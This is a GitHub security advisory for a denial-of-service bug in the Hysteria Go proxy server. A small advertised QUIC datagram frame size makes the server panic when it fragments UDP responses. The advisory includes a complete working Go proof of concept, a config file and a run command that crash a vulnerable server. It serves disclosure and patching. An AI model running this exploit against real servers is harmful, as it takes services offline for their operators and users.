# [H] Hysteria vulnerable to server crash when max_datagram_frame_size very small

## Summary
Severity: High
Advisory: GHSA-qh5x-rfwf-rvfv
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-qh5x-rfwf-rvfv
Type: github-advisory

## Affected
- Go: `github.com/apernet/hysteria` — affected >=0 <2.9.2

## Details
### Summary

An authenticated client can crash the Hysteria server by advertising a very small QUIC `max_datagram_frame_size` and then triggering a UDP response from the server. When the server tries to send the UDP response back via QUIC DATAGRAM, quic-go returns `DatagramTooLargeError`. The server then attempts to fragment the Hysteria UDP message, but the fragmentation code does not handle the case where the UDP message header itself is larger than the maximum datagram payload size. This results in a slice bounds panic and terminates the server process.

### Details


The vulnerable path is the normal server-side UDP response path:

```text
udpSessionEntry.receiveLoop
  -> sendMessageAutoFrag
    -> frag.FragUDPMessage
```

In `core/server/udp.go`, `receiveLoop` packages a UDP response into a `protocol.UDPMessage` and calls `sendMessageAutoFrag`. If `SendDatagram` fails with `quic.DatagramTooLargeError`, `sendMessageAutoFrag` calls:

```go
fMsgs := frag.FragUDPMessage(msg, int(errTooLarge.MaxDatagramPayloadSize))
```

However, `FragUDPMessage` in `core/internal/frag/frag.go` assumes that `maxSize` is greater than the UDP message header size:

```go
maxPayloadSize := maxSize - m.HeaderSize()
```

If an attacker-controlled client advertises a small enough `max_datagram_frame_size`, `errTooLarge.MaxDatagramPayloadSize` can be smaller than `m.HeaderSize()`. In that case, `maxPayloadSize` becomes zero or negative, and the later slicing operation panics:

```go
frag.Data = fullPayload[off : off+payloadSize]
```


### PoC

poc.yaml

```yaml
listen: 127.0.0.1:8443

tls:
  cert: poc_server.crt
  key: poc_server.key

auth:
  type: password
  password: udp-frag-panic-poc


masquerade:
  type: string
  string:
    content: nope
    statusCode: 404
```

poc.go

```go
//go:build poc

package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"time"

	"github.com/apernet/quic-go"
	"github.com/apernet/quic-go/http3"
	"github.com/apernet/quic-go/quicvarint"
)

const (
	authHost = "hysteria"
	authPath = "/auth"
	authOK   = 233
)

func main() {
	server := flag.String("server", "127.0.0.1:8443", "Hysteria server address")
	auth := flag.String("auth", "", "Hysteria auth/password")
	target := flag.String("target", "127.0.0.1:19090", "UDP target reachable from the server")
	maxDatagram := flag.Int64("max-datagram", 20, "QUIC max_datagram_frame_size advertised by this client")
	insecure := flag.Bool("insecure", true, "skip TLS verification")
	echo := flag.Bool("echo", true, "start a local UDP echo server on --target")
	flag.Parse()

	if *auth == "" {
		panic("--auth is required")
	}
	if *echo {
		closeEcho := startUDPEcho(*target)
		defer closeEcho()
	}

	conn, cleanup := dialAndAuth(*server, *auth, *insecure, *maxDatagram)
	defer cleanup()

	msg := hysteriaUDPMessage(1, *target, []byte("X"))
	fmt.Printf("[*] authenticated, target=%s, headerSize=%d, datagramSize=%d, advertisedMaxDatagram=%d\n",
		*target, udpHeaderSize(*target), len(msg), *maxDatagram)

	if err := conn.SendDatagram(msg); err != nil {
		panic(fmt.Errorf("send trigger datagram: %w", err))
	}
	fmt.Println("[+] trigger sent; vulnerable server should panic in frag.FragUDPMessage")

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	if _, err := conn.ReceiveDatagram(ctx); err != nil {
		fmt.Printf("[*] receive after trigger: %v\n", err)
	} else {
		fmt.Println("[!] received a response; try a smaller --max-datagram")
	}
}

func dialAndAuth(server, auth string, insecure bool, maxDatagram int64) (*quic.Conn, func()) {
	serverAddr, err := net.ResolveUDPAddr("udp", server)
	if err != nil {
		panic(err)
	}
	udpConn, err := net.ListenUDP("udp", nil)
	if err != nil {
		panic(err)
	}

	transport := &quic.Transport{Conn: udpConn}
	var qconn *quic.Conn
	rt := &http3.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecure},
		QUICConfig: &quic.Config{
			EnableDatagrams:      true,
			MaxDatagramFrameSize: maxDatagram,
			DisablePathManager:   true,
		},
		Dial: func(ctx context.Context, _ string, tlsCfg *tls.Config, cfg *quic.Config) (*quic.Conn, error) {
			qconn, err = transport.DialEarly(ctx, serverAddr, tlsCfg, cfg)
			return qconn, err
		},
	}

	req := &http.Request{
		Method: http.MethodPost,
		Host:   authHost,
		URL:    &url.URL{Scheme: "https", Host: authHost, Path: authPath},
		Header: http.Header{},
		Body:   io.NopCloser(bytes.NewReader(nil)),
	}
	req.Header.Set("Hysteria-Auth", auth)
	req.Header.Set("Hysteria-CC-RX", "0")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	resp, err := rt.RoundTrip(req.WithContext(ctx))
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != authOK {
		panic(fmt.Errorf("auth failed: HTTP status %d", resp.StatusCode))
	}
	if resp.Header.Get("Hysteria-UDP") == "false" {
		panic("server reports UDP disabled")
	}

	cleanup := func() {
		_ = rt.Close()
		_ = transport.Close()
		_ = udpConn.Close()
		if qconn != nil {
			_ = qconn.CloseWithError(0, "")
		}
	}
	return qconn, cleanup
}

func hysteriaUDPMessage(sessionID uint32, addr string, data []byte) []byte {
	buf := make([]byte, udpHeaderSize(addr)+len(data))
	binary.BigEndian.PutUint32(buf[0:4], sessionID)
	// PacketID=0, FragID=0, FragCount=1.
	buf[7] = 1
	i := len(quicvarint.Append(buf[:8], uint64(len(addr))))
	i += copy(buf[i:], addr)
	copy(buf[i:], data)
	return buf
}

func udpHeaderSize(addr string) int {
	return 8 + quicvarint.Len(uint64(len(addr))) + len(addr)
}

func startUDPEcho(addr string) func() {
	pc, err := net.ListenPacket("udp", addr)
	if err != nil {
		panic(fmt.Errorf("start UDP echo on %s: %w", addr, err))
	}
	fmt.Printf("[*] UDP echo listening on %s\n", pc.LocalAddr())

	go func() {
		buf := make([]byte, 2048)
		for {
			n, raddr, err := pc.ReadFrom(buf)
			if err != nil {
				return
			}
			_, _ = pc.WriteTo(buf[:n], raddr)
		}
	}()
	return func() { _ = pc.Close() }
}
```

poc.sh
```bash
go run -tags poc ./poc_udp_frag_panic.go \
  --server 127.0.0.1:8443 \
  --auth udp-frag-panic-poc \
  --insecure \
  --target 127.0.0.1:19090 \
  --max-datagram 20
```



### Impact
Server crash

## References
- https://github.com/apernet/hysteria/security/advisories/GHSA-qh5x-rfwf-rvfv
- https://github.com/apernet/hysteria
